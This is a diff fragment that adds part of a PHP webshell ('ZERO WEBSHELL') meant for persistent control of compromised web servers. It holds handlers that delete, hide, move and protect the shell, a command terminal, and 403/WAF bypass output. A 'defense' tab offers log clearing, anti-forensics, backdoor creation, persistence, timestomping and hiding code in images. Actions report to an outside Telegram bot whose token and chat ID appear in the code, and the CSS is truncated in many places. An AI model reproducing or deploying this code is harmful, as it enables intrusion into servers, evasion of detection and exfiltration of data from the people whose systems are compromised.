+                $msg .= "├─ 📍 New location: <code>" . $restore_to . "</code>\n";
+                $msg .= "├─ 🌐 New URL: <code>http://" . $_SERVER['HTTP_HOST'] . "/" . $restore_to . "</code>\n";
+                $msg .= "└─ ✅ Status: <code>Shell is ALIVE</code>\n\n";
+            } else {
+                $msg .= "❌ <b>AUTO-RESURRECTION FAILED</b>\n";
+                $msg .= "└─ ⚠️ All backups unavailable\n\n";
+            }
+            
+            $msg .= "👨‍💻 <b>Author:</b> <code>@MrZeroReall</code>\n";
+            $msg .= "📢 <b>Channel:</b> t.me/MrZeroReall\n";
+            $msg .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";
+            
+        } else {
+            $msg = "╔═══════════════════════════════════╗\n";
+            $msg .= "║  🗑️ <b>FILE DELETED</b> 🗑️  ║\n";
+            $msg .= "╚═══════════════════════════════════╝\n\n";
+            
+            $msg .= "📁 <b>File:</b> <code>" . $filename . "</code>\n";
+            $msg .= "📏 <b>Size:</b> <code>" . round($file_size/1024, 2) . " KB</code>\n";
+            $msg .= "📂 <b>Path:</b> <code>" . $file . "</code>\n";
+            $msg .= "🔗 <b>IP:</b> <code>" . get_ip() . "</code>\n";
+            $msg .= "🕒 <b>Time:</b> <code>" . date('Y-m-d H:i:s') . "</code>\n\n";
+            
+            $msg .= "👨‍💻 <b>Author:</b> <code>@MrZeroReall</code>\n";
+            $msg .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";
+        }
+        
+        send_telegram($msg);
+        
+    } elseif (is_dir($file)) {
+        $msg = "╔═══════════════════════════════════╗\n";
+        $msg .= "║  🗑️ <b>FOLDER DELETED</b> 🗑️  ║\n";
+        $msg .= "╚═══════════════════════════════════╝\n\n";
+        
+        $msg .= "📁 <b>Folder:</b> <code>" . $filename . "</code>\n";
+        $msg .= "📂 <b>Path:</b> <code>" . $file . "</code>\n";
+        $msg .= "🔗 <b>IP:</b> <code>" . get_ip() . "</code>\n";
+        $msg .= "🕒 <b>Time:</b> <code>" . date('Y-m-d H:i:s') . "</code>\n\n";
+        
+        $msg .= "👨‍💻 <b>Author:</b> <code>@MrZeroReall</code>\n";
+        $msg .= "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━";
+        
+        rmdir($file);
+        send_telegram($msg);
+    }
+    
+    write_log("Delete: " . $filename);
+    header('Location: ?dir=' . urlencode($dir) . '&csrf=' . $csrf);
+    exit;
+}
+
+if (isset($_GET['hide']) && isset($_GET['csrf']) && verify_csrf_token($_GET['csrf'])) {
+    $file = get_safe_path($dir, $_GET['hide']);
+    $hidden = hide_shell($file);
+    $msg = "Shell Hidden\n";
+    $msg .= "IP: " . get_ip() . "\n";
+    $msg .= "From: " . basename($file) . "\n";
+    $msg .= "To: " . basename($hidden);
+    send_telegram($msg);
+    write_log("Hide: " . basename($file));
+    header('Location: ?dir=' . urlencode($dir) . '&csrf=' . $csrf);
+    exit;
+}
+
+if (isset($_GET['protect']) && isset($_GET['csrf']) && verify_csrf_token($_GET['csrf'])) {
+    inject_htaccess($dir);
+    $msg = "HTACCESS Injected\n";
+    $msg .= "IP: " . get_ip() . "\n";
+    $msg .= "Dir: " . $dir;
+    send_telegram($msg);
+    write_log("HTAccess injected: $dir");
+    header('Location: ?dir=' . urlencode($dir) . '&csrf=' . $csrf);
+    exit;
+}
+
+if (isset($_GET['move']) && isset($_GET['csrf']) && verify_csrf_token($_GET['csrf'])) {
+    $file = get_safe_path($dir, $_GET['move']);
+    $moved = move_shell($file);
+    $msg = "Shell Moved\n";
+    $msg .= "IP: " . get_ip() . "\n";
+    $msg .= "Source: " . basename($file) . "\n";
+    $msg .= "Copies: " . count($moved);
+    send_telegram($msg);
+    write_log("Shell moved: " . implode(', ', $moved));
+    header('Location: ?dir=' . urlencode($dir) . '&csrf=' . $csrf);
+    exit;
+}
+
+if (isset($_GET['backup']) && isset($_GET['csrf']) && verify_csrf_token($_GET['csrf'])) {
+    $file = get_safe_path($dir, $_GET['backup']);
+    $backups = anti_delete($file);
+    $msg = "Anti-Delete Setup\n";
+    $msg .= "IP: " . get_ip() . "\n";
+    $msg .= "File: " . basename($file);
+    send_telegram($msg);
+    write_log("Anti-delete setup: " . basename($file));
+    header('Location: ?dir=' . urlencode($dir) . '&csrf=' . $csrf);
+    exit;
+}
+
+if (isset($_GET['download'])) {
+    $file = get_safe_path($dir, $_GET['download']);
+    if (is_file($file)) {
+        serve_with_bypass($file);
+        write_log("Download: " . basename($file));
+        exit;
+    }
+}
+
+if (isset($_POST['newfile']) && isset($_POST['csrf']) && verify_csrf_token($_POST['csrf'])) {
+    $file = $dir . '/' . basename($_POST['filename']);
+    if (!file_exists($file)) {
+        file_put_contents($file, '');
+        write_log("New file: " . basename($file));
+    }
+}
+
+if (isset($_POST['newfolder']) && isset($_POST['csrf']) && verify_csrf_token($_POST['csrf'])) {
+    $folder = $dir . '/' . basename($_POST['foldername']);
+    if (!file_exists($folder)) {
+        mkdir($folder);
+        write_log("New folder: " . basename($folder));
+    }
+}
+
+if (isset($_POST['save']) && isset($_POST['csrf']) && verify_csrf_token($_POST['csrf'])) {
+    $file = $_POST['file'];
+    if (is_file($file)) {
+        file_put_contents($file, $_POST['content']);
+        write_log("File saved: " . basename($file));
+    }
+}
+
+$edit_file = isset($_GET['edit']) ? get_safe_path($dir, $_GET['edit']) : '';
+$cmd_output = isset($cmd_result) ? $cmd_result : '';
+$current_dir = str_replace('\\', '/', $dir);
+$parent_dir = dirname($current_dir);
+?>
+<!DOCTYPE html>
+<html>
+<head>
+    <title>ZERO WEBSHELL</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <style>
+        * { margin:0; padding:0; box-sizing:border-box; }
+        body { background:
+        @media (min-width:768px) { body { padding:20px; } }
+        
+        .header { 
+            background:
+            padding:15px; 
+            border-radius:5px; 
+            margin-bottom:15px; 
+            border-left:4px solid 
+            display:flex; 
+            flex-direction:column; 
+            gap:10px; 
+        }
+        @media (min-width:768px) { 
+            .header { flex-direction:row; justify-content:space-between; align-items:center; } 
+        }
+        .header h1 { color:
+        .header span { color:
+        
+        .info-grid { 
+            display:grid; 
+            grid-template-columns:1fr; 
+            gap:8px; 
+            margin-bottom:15px; 
+        }
+        @media (min-width:480px) { .info-grid { grid-template-columns:repeat(2,1fr); } }
+        @media (min-width:768px) { .info-grid { grid-template-columns:repeat(3,1fr); } }
+        @media (min-width:1024px) { .info-grid { grid-template-columns:repeat(6,1fr); } }
+        
+        .info-item { 
+            background:
+            padding:10px; 
+            border-radius:5px; 
+            border:1px solid 
+            font-size:11px; 
+            overflow:hidden; 
+            text-overflow:ellipsis; 
+        }
+        
+        .path { 
+            background:
+            padding:10px; 
+            border-radius:5px; 
+            margin-bottom:15px; 
+            border:1px solid 
+            display:flex; 
+            gap:8px; 
+            flex-wrap:wrap; 
+            font-size:12px; 
+        }
+        .path a { 
+            color:
+            text-decoration:none; 
+            padding:3px 6px; 
+            background:
+            border-radius:3px; 
+            white-space:nowrap; 
+        }
+        
+        .tools { 
+            display:flex; 
+            flex-direction:column; 
+            gap:10px; 
+            margin-bottom:15px; 
+        }
+        @media (min-width:768px) { .tools { flex-direction:row; flex-wrap:wrap; } }
+        
+        .tools form { 
+            background:
+            padding:10px; 
+            border-radius:5px; 
+            border:1px solid 
+            display:flex; 
+            flex-wrap:wrap; 
+            gap:8px; 
+            flex:1; 
+        }
+        .tools input, .tools select { 
+            background:
+            border:1px solid 
+            color:
+            padding:8px; 
+            border-radius:3px; 
+            font-family:monospace; 
+            font-size:12px; 
+            flex:1; 
+            min-width:120px; 
+        }
+        .tools button { 
+            background:
+            border:none; 
+            color:
+            padding:8px 12px; 
+            border-radius:3px; 
+            cursor:pointer; 
+            font-weight:bold; 
+            font-size:12px; 
+        }
+        
+        .cmd-box { 
+            background:
+            border:1px solid 
+            border-radius:5px; 
+            padding:12px; 
+            margin-bottom:15px; 
+        }
+        .cmd-box input { 
+            width:100%; 
+            background:
+            border:1px solid 
+            color:
+            padding:10px; 
+            font-family:monospace; 
+            border-radius:3px; 
+            font-size:13px; 
+        }
+        .cmd-output { 
+            background:
+            border:1px solid 
+            border-radius:3px; 
+            padding:12px; 
+            margin-top:10px; 
+            font-family:monospace; 
+            font-size:12px; 
+            white-space:pre-wrap; 
+            color:
+            max-height:300px; 
+            overflow:auto; 
+        }
+        
+        .table-wrapper { overflow-x:auto; margin-bottom:15px; }
+        table { 
+            width:100%; 
+            background:#
+            border-radius:5px; 
+            border-collapse:collapse; 
+            border:1px solid 
+            font-size:12px; 
+            min-width:600px; 
+        }
+        th { 
+            background:
+            color:
+            font-weight:normal; 
+            padding:10px; 
+            text-align:left; 
+        }
+        td { 
+            padding:8px 10px; 
+            border-top:1px solid 
+        }
+        
+        .actions { 
+            display:flex; 
+            gap:5px; 
+            flex-wrap:wrap; 
+        }
+        .actions a { 
+            color:
+            text-decoration:none; 
+            padding:3px 5px; 
+            background:
+            border-radius:3px; 
+            font-size:12px; 
+            white-space:nowrap; 
+        }
+        .actions a:hover { color:
+        
+        .editor { 
+            background:
+            border:1px solid 
+            border-radius:5px; 
+            padding:15px; 
+            margin-top:15px; 
+        }
+        .editor textarea { 
+            width:100%; 
+            height:250px; 
+            background:
+            border:1px solid 
+            color:
+            padding:12px; 
+            font-family:monospace; 
+            font-size:12px; 
+            margin:10px 0; 
+            border-radius:3px; 
+        }
+        
+        .tabs { 
+            display:flex; 
+            gap:2px; 
+            margin-bottom:15px; 
+            flex-wrap:wrap; 
+        }
+        .tab-btn { 
+            background:
+            border:none; 
+            color:
+            padding:8px 15px; 
+            cursor:pointer; 
+            border-radius:5px 5px 0 0; 
+            font-size:12px; 
+            flex:1; 
+        }
+        .tab-btn.active { 
+            background:
+            color:
+        }
+        .tab-content { display:none; }
+        .tab-content.active { display:block; }
+        
+        .footer { 
+            margin-top:15px; 
+            text-align:center; 
+            color:
+            font-size:11px; 
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <h1>ZERO WEBSHELL v<?php echo $version; ?></h1>
+        <div><span><?php echo $author; ?> | <?php echo $channel; ?></span></div>
+    </div>
+
+    <div class="info-grid">
+        <div class="info-item">IP: <?php echo get_ip(); ?></div>
+        <div class="info-item">OS: <?php echo php_uname('s'); ?></div>
+        <div class="info-item">Kernel: <?php echo php_uname('r'); ?></div>
+        <div class="info-item">Host: <?php echo php_uname('n'); ?></div>
+        <div class="info-item">Arch: <?php echo php_uname('m'); ?></div>
+        <div class="info-item">PHP: <?php echo phpversion(); ?></div>
+    </div>
+
+    <div class="tabs">
+        <button class="tab-btn active" onclick="showTab('file')">FILE MANAGER</button>
+        <button class="tab-btn" onclick="showTab('terminal')">TERMINAL</button>
+        <button class="tab-btn" onclick="showTab('bypass')">BYPASS</button>
+        <button class="tab-btn" onclick="showTab('protect')">PROTECT</button>
+        <button class="tab-btn" onclick="showTab('defense')">DEFENSE</button>
+        <button class="tab-btn" onclick="showTab('info')">INFO</button>
+    </div>
+
+    <div id="file" class="tab-content active">
+        <div class="path">
+            <a href="?dir=<?php echo urlencode($root); ?>&csrf=<?php echo $csrf; ?>">ROOT</a>
+            <?php
+            $rel = str_replace($root, '', $current_dir);
+            $parts = explode('/', trim($rel, '/'));
+            $path = $root;
+            echo '<a href="?dir=' . urlencode($path) . '&csrf=' . $csrf . '">/</a>';
+            foreach ($parts as $part) {
+                if ($part) {
+                    $path .= '/' . $part;
+                    echo '<a href="?dir=' . urlencode($path) . '&csrf=' . $csrf . '">' . $part . '/</a>';
+                }
+            }
+            ?>
+        </div>
+
+        <div class="tools">
+            <form method="post" enctype="multipart/form-data">
+                <input type="hidden" name="csrf" value="<?php echo $csrf; ?>">
+                <input type="file" name="file" required>
+                <button type="submit" name="upload">UPLOAD</button>
+            </form>
+            <form method="post">
+                <input type="hidden" name="csrf" value="<?php echo $csrf; ?>">
+                <input type="text" name="filename" placeholder="File" required>
+                <button type="submit" name="newfile">FILE</button>
+            </form>
+            <form method="post">
+                <input type="hidden" name="csrf" value="<?php echo $csrf; ?>">
+                <input type="text" name="foldername" placeholder="Folder" required>
+                <button type="submit" name="newfolder">FOLDER</button>
+            </form>
+        </div>
+
+        <div class="table-wrapper">
+            <table>
+                <tr><th>NAMA</th><th>SIZE</th><th>PERM</th><th>MODIFIED</th><th>AKSI</th></tr>
+                <?php if ($parent_dir && $parent_dir != $current_dir): ?>
+                <tr><td colspan="5"><a href="?dir=<?php echo urlencode($parent_dir); ?>&csrf=<?php echo $csrf; ?>">📁 ..</a></td></tr>
+                <?php endif; ?>
+                <?php
+                $items = scandir($dir);
+                $folders = []; $files = [];
+                foreach ($items as $item) {
+                    if ($item == '.' || $item == '..') continue;
+                    $full = $dir . '/' . $item;
+                    if (is_dir($full)) $folders[] = $item;
+                    else $files[] = $item;
+                }
+                sort($folders); sort($files);
+                foreach ($folders as $item):
+                    $full = $dir . '/' . $item;
+                ?>
+                <tr><td><a href="?dir=<?php echo urlencode($full); ?>&csrf=<?php echo $csrf; ?>">📁 <?php echo $item; ?></a></td><td>--</td><td><?php echo substr(sprintf('%o', fileperms($full)), -4); ?></td><td><?php echo date('Y-m-d H:i', filemtime($full)); ?></td><td class="actions"><a href="?delete=<?php echo urlencode($item); ?>&dir=<?php echo urlencode($dir); ?>&csrf=<?php echo $csrf; ?>" onclick="return confirm('Hapus?')">🗑️</a></td></tr>
+                <?php endforeach; ?>
+                <?php foreach ($files as $item):
+                    $full = $dir . '/' . $item;
+                    $size = filesize($full);
+                ?>
+                <tr><td><a href="?edit=<?php echo urlencode($item); ?>&dir=<?php echo urlencode($dir); ?>&csrf=<?php echo $csrf; ?>">📄 <?php echo $item; ?></a></td><td><?php echo round($size/1024,2); ?> KB</td><td><?php echo substr(sprintf('%o', fileperms($full)), -4); ?></td><td><?php echo date('Y-m-d H:i', filemtime($full)); ?></td><td class="actions">
+                    <a href="?edit=<?php echo urlencode($item); ?>&dir=<?php echo urlencode($dir); ?>&csrf=<?php echo $csrf; ?>">✏️</a>
+                    <a href="?download=<?php echo urlencode($item); ?>&dir=<?php echo urlencode($dir); ?>">⬇️</a>
+                    <a href="?hide=<?php echo urlencode($item); ?>&dir=<?php echo urlencode($dir); ?>&csrf=<?php echo $csrf; ?>" onclick="return confirm('Sembunyikan?')">👁️</a>
+                    <a href="?backup=<?php echo urlencode($item); ?>&dir=<?php echo urlencode($dir); ?>&csrf=<?php echo $csrf; ?>" onclick="return confirm('Setup anti-delete?')">🛡️</a>
+                    <a href="?move=<?php echo urlencode($item); ?>&dir=<?php echo urlencode($dir); ?>&csrf=<?php echo $csrf; ?>" onclick="return confirm('Pindah?')">📦</a>
+                    <a href="?delete=<?php echo urlencode($item); ?>&dir=<?php echo urlencode($dir); ?>&csrf=<?php echo $csrf; ?>" onclick="return confirm('Hapus?')">🗑️</a>
+                </td></tr>
+                <?php endforeach; ?>
+            </table>
+        </div>
+
+        <?php if ($edit_file && is_file($edit_file)): 
+            $content = file_get_contents($edit_file);
+        ?>
+        <div class="editor">
+            <h3>EDIT: <?php echo basename($edit_file); ?></h3>
+            <form method="post">
+                <input type="hidden" name="csrf" value="<?php echo $csrf; ?>">
+                <textarea name="content"><?php echo htmlspecialchars($content); ?></textarea>
+                <input type="hidden" name="file" value="<?php echo $edit_file; ?>">
+                <button type="submit" name="save">SIMPAN</button>
+            </form>
+        </div>
+        <?php endif; ?>
+    </div>
+
+    <div id="terminal" class="tab-content">
+        <div class="cmd-box">
+            <form method="post">
+                <input type="hidden" name="csrf" value="<?php echo $csrf; ?>">
+                <input type="text" name="cmd" placeholder="$ command" value="<?php echo isset($_POST['cmd']) ? htmlspecialchars($_POST['cmd']) : ''; ?>" autocomplete="off">
+            </form>
+            <?php if ($cmd_output): ?>
+            <div class="cmd-output"><?php echo htmlspecialchars($cmd_output); ?></div>
+            <?php endif; ?>
+        </div>
+    </div>
+
+    <div id="bypass" class="tab-content">
+        <div class="editor">
+            <h3>403 FORBIDDEN</h3>
+            <textarea readonly style="height:150px;"><?php echo implode("\n", bypass_403()); ?></textarea>
+            
+            <h3 style="margin-top:20px;">406 NOT ACCEPTABLE</h3>
+            <textarea readonly style="height:150px;"><?php echo implode("\n", bypass_406()); ?></textarea>
+            
+            <h3 style="margin-top:20px;">LITESPEED</h3>
+            <textarea readonly style="height:150px;"><?php echo implode("\n", bypass_litespeed()); ?></textarea>
+            
+            <h3 style="margin-top:20px;">ANTI DOWNLOAD</h3>
+            <form method="post">
+                <input type="hidden" name="csrf" value="<?php echo $csrf; ?>">
+                <textarea name="encode_content" placeholder="Paste shell code here..." style="height:100px;"></textarea>
+                <button type="submit" name="encode">ENCODE</button>
+            </form>
+            
+            <?php if (isset($_POST['encode']) && isset($_POST['encode_content'])): ?>
+            <h3 style="margin-top:20px;">ENCODED SHELL</h3>
+            <textarea readonly style="height:200px;"><?php echo anti_download($_POST['encode_content']); ?></textarea>
+            <?php endif; ?>
+        </div>
+    </div>
+
+    <div id="protect" class="tab-content">
+        <div class="editor">
+            <h3>HTACCESS</h3>
+            <p><a href="?protect=1&dir=<?php echo urlencode($dir); ?>&csrf=<?php echo $csrf; ?>">🔒 INJECT HTACCESS</a></p>
+            
+            <h3 style="margin-top:20px;">MOVE SHELL</h3>
+            <p><a href="?move=<?php echo urlencode(basename($_SERVER['PHP_SELF'])); ?>&dir=<?php echo urlencode($dir); ?>&csrf=<?php echo $csrf; ?>">📦 MOVE SHELL</a></p>
+            
+            <h3 style="margin-top:20px;">ANTI DELETE</h3>
+            <p><a href="?backup=<?php echo urlencode(basename($_SERVER['PHP_SELF'])); ?>&dir=<?php echo urlencode($dir); ?>&csrf=<?php echo $csrf; ?>">🛡️ SETUP ANTI-DELETE</a></p>
+            
+            <h3 style="margin-top:20px;">HIDE SHELL</h3>
+            <p><a href="?hide=<?php echo urlencode(basename($_SERVER['PHP_SELF'])); ?>&dir=<?php echo urlencode($dir); ?>&csrf=<?php echo $csrf; ?>">👁️ HIDE SHELL</a></p>
+        </div>
+    </div>
+
+    <div id="defense" class="tab-content">
+        <div class="editor">
+            <h3>🔄 POLYMORPHIC</h3>
+            <p>Change shell signature to avoid detection</p>
+            <p><a href="?action=mutate&csrf=<?php echo $csrf; ?>">🔄 MUTATE SHELL</a></p>
+            
+            <h3 style="margin-top:20px;">🧹 ANTI-FORENSIC</h3>
+            <p>Clear logs and traces</p>
+            <p><a href="?action=clear_logs&csrf=<?php echo $csrf; ?>">🧹 CLEAR ALL LOGS</a></p>
+            <p><a href="?action=anti_forensic&csrf=<?php echo $csrf; ?>">🧹 ANTI-FORENSIC</a></p>
+            
+            <h3 style="margin-top:20px;">👻 STEALTH MODE</h3>
+            <p>Hide process and create backdoors</p>
+            <p><a href="?action=hide_process&csrf=<?php echo $csrf; ?>">👻 HIDE PROCESS</a></p>
+            <p><a href="?action=create_backdoors&csrf=<?php echo $csrf; ?>">🚪 CREATE BACKDOORS</a></p>
+            
+            <h3 style="margin-top:20px;">⏰ PERSISTENCE</h3>
+            <p>Auto-restart and maintain access</p>
+            <p><a href="?action=persistence&csrf=<?php echo $csrf; ?>">⏰ SETUP PERSISTENCE</a></p>
+            
+            <h3 style="margin-top:20px;">🕰️ TIMESTOMP</h3>
+            <p>Modify file timestamps</p>
+            <form method="get" style="display:inline-block;">
+                <input type="hidden" name="action" value="timestomp">
+                <input type="hidden" name="csrf" value="<?php echo $csrf; ?>">
+                <input type="text" name="target_file" placeholder="filename" style="width:200px;">
+                <button type="submit">🕰️ TIMESTOMP</button>
+            </form>
+            
+            <h3 style="margin-top:20px;">🖼️ STEGANOGRAPHY</h3>
+            <p>Hide shell in image</p>
+            <form method="post" enctype="multipart/form-data">
+                <input type="hidden" name="csrf" value="<?php echo $csrf; ?>">
+                <input type="hidden" name="action" value="hide_in_image">
+                <input type="file" name="image" accept="image/*">
+                <textarea name="shell_code" placeholder="Shell code to hide..." style="height:100px;"></textarea>
+                <button type="submit">🖼️ HIDE IN IMAGE</button>
+            </form>
+            
+            <h3 style="margin-top:20px;">🔓 DISABLE FUNCTIONS BYPASS</h3>
+            <form method="post">
+                <input type="hidden" name="csrf" value="<?php echo $csrf; ?>">
+                <input type="hidden" name="action" value="bypass_disabled">
+                <input type="text" name="bypass_cmd" placeholder="command" style="width:100%;">
+                <button type="submit">🔓 BYPASS & EXECUTE</button>
+            </form>
+            
+            <h3 style="margin-top:20px;">🔐 ENCRYPT TRAFFIC</h3>
+            <form method="post">
+                <input type="hidden" name="csrf" value="<?php echo $csrf; ?>">
+                <input type="hidden" name="action" value="encrypt">
+                <textarea name="plain_text" placeholder="Text to encrypt..." style="height:100px;"></textarea>
+                <input type="text" name="enc_key" placeholder="Encryption key (optional)">
+                <button type="submit">🔐 ENCRYPT</button>
+            </form>
+            
+            <?php if (isset($_POST['action']) && $_POST['action'] == 'encrypt' && isset($_POST['plain_text'])): ?>
+            <h3 style="margin-top:20px;">ENCRYPTED</h3>
+            <textarea readonly style="height:100px;"><?php echo encrypt_traffic($_POST['plain_text'], $_POST['enc_key'] ?? null); ?></textarea>
+            <?php endif; ?>
+            
+            <h3 style="margin-top:20px;">📊 STATUS</h3>
+            <textarea readonly style="height:150px;">
+Current Shell: <?php echo basename(__FILE__); ?>
+
+Current Dir: <?php echo getcwd(); ?>
+
+Writable: <?php echo is_writable('.') ? 'YES' : 'NO'; ?>
+
+Disable Functions: <?php echo ini_get('disable_functions') ?: 'none'; ?>
+
+Safe Mode: <?php echo ini_get('safe_mode') ? 'ON' : 'OFF'; ?>
+
+Sandbox Check: <?php echo check_sandbox() ? 'DETECTED' : 'CLEAN'; ?>
+            </textarea>
+        </div>
+    </div>
+
+    <div id="info" class="tab-content">
+        <div class="editor">
+            <h3>TELEGRAM</h3>
+            <?php if ($telegram_token != '5889811852:AAFYXZvbsxZSdFd7r6nxLUOsNPLcpMp8XhA' && $telegram_chat_id != '5673963782'): ?>
+            <p>✅ Telegram aktif</p>
+            <?php else: ?>
+            <p>❌ Telegram tidak aktif</p>
+            <?php endif; ?>
+            
+            <h3 style="margin-top:20px;">SYSTEM</h3>
+            <textarea readonly style="height:200px;">
+PHP Version    : <?php echo phpversion(); ?>
+Server         : <?php echo $_SERVER['SERVER_SOFTWARE']; ?>
+Document Root  : <?php echo $_SERVER['DOCUMENT_ROOT']; ?>
+Current Dir    : <?php echo $current_dir; ?>
+Disable Funcs  : <?php echo ini_get('disable_functions') ?: 'none'; ?>
+Memory Limit   : <?php echo ini_get('memory_limit'); ?>
+Max Execution  : <?php echo ini_get('max_execution_time'); ?>s
+            </textarea>
+        </div>
+    </div>
+
+    <div class="footer">
+        <a href="?logout=1">LOGOUT</a> | v<?php echo $version; ?>
+    </div>
+
+    <script>
+        function showTab(tab) {
+            document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
+            document.querySelectorAll('.tab-btn').forEach(el => el.classList.remove('active'));
+            document.getElementById(tab).classList.add('active');
+            event.target.classList.add('active');
+        }
+    </script>
+</body>
+</html>
+<?php
+if (isset($_GET['logout'])) {
+    session_destroy();
+    header('Location: ?');
+    exit;
+}
+?>
